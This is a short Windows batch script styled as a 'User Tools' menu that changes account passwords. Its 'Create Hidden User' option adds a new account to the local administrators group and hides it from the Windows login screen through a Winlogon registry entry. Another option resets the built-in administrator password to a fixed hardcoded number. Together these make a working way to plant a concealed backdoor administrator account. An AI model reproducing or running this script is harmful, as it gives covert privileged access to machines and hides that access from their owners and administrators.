echo off
color A
cls
:MENU
ECHO. 
ECHO                               .................................................. 
ECHO. 
ECHO                                                  USER TOOLS
ECHO.
ECHO                                               Support ID : M38D1
ECHO.
ECHO                                          Website : www.mehdiaskari.ir
ECHO.                                   
ECHO                               .................................................. 
ECHO. 
ECHO  1- Change Password
ECHO  2- Create Hidden User
ECHO  3- Set Password Default = 09368781199
ECHO. 
SET /P M=Choice the number then press ENTER:
IF %M%==1 GOTO ChangePass 
IF %M%==2 GOTO HiddenUser 
IF %M%==3 GOTO SetPass 

:ChangePass
cls
REM "Change Password"
REM ------------------------------
@echo off
set /p user=Please Enter Your Username:
set /p pass=Please Enter Desired Password:
net user %user% %pass%
GOTO MENU

:HiddenUser
cls
REM "Create Hidden User"
REM ------------------------------
@echo off
set /p user=Please Enter Desired Username:
set /p pass=Please Enter Desired Password:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
GOTO MENU

:SetPass
cls
REM "Set Password Default"
REM ------------------------------
@echo off
net user administrator 09368781199
GOTO MENU


